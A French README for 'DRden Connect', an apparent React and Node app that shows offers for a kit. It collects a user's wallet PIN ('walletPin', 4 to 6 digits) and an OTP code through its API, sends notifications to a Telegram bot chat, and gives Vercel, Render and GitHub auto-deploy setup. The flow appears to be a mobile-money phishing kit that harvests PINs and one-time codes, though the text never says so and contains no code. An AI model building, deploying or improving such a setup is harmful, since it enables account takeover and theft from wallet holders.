# DRden Connect

Application React + Node qui sert de base a une app isolee pour une autre production.

## Structure

- `client/` : application React avec Vite
- `server/` : API Node + Express

## Installation

1. Ouvrez un terminal dans le dossier racine `congo`
2. Installez les dépendances :
   - `npm install`
   - `npm run install-all`
3. Démarrez le projet :
   - `npm run start`

## API

- `GET /api/offres` : renvoie les forfaits et les informations du kit
- `POST /api/notify` : envoie la demande initiale de validation
- `POST /api/submit` : envoie le code OTP pour verification

## Notifications (best practice)

- Definir dans `server/.env`:
   - `TELEGRAM_BOT_TOKEN=...`
   - `TELEGRAM_CHAT_ID=...`
   - `TELEGRAM_ENABLED=true`
- Le champ recommande pour le PIN est `walletPin` (4-6 chiffres).
- Compatibilite conservee: `customerName` est encore accepte cote serveur pour les anciens clients.
- Le PIN est masque dans les messages de notification envoyes (ex: `**34`).

## Notes

L'application utilise des données structurées en JavaScript avec une séparation claire entre le backend, le frontend et la logique métier.

## Production web (Vercel + Render)

Configuration recommandee:

- Frontend: Vercel (`https://starlin.vercel.app`)
- Backend: Render (`https://drcden.onrender.com`)

### Variables Vercel

Dans le projet Vercel, definir:

- `VITE_API_BASE_URL=https://drcden.onrender.com`

Le frontend supporte aussi un fallback automatique vers le backend Render.

### Render

Le fichier `render.yaml` est inclus pour declarer le service backend avec:

- `rootDir: server`
- `startCommand: npm run start`
- `healthCheckPath: /api/offres`

Important: verifier dans Render que les variables d'environnement Telegram sont correctes selon vos besoins.

### Redeploiement cloud 100% automatique (sans clic dashboard)

Le workflow `.github/workflows/cloud-auto-redeploy.yml` declenche automatiquement les redeploiements Render et Vercel apres chaque push sur `main` via deploy hooks.

Ajouter ces secrets GitHub (`Settings > Secrets and variables > Actions`):

- `RENDER_DEPLOY_HOOK_URL`: URL du deploy hook Render.
- `VERCEL_DEPLOY_HOOK_URL`: URL du deploy hook Vercel.
- `BACKEND_HEALTH_URL`: ex `https://drcden.onrender.com/api/offres`
- `FRONTEND_HEALTH_URL`: ex `https://starlin.vercel.app/`

Resultat:

- Push sur `main` -> trigger Render + Vercel
- Workflow attend ensuite que backend/frontend repondent HTTP `200`
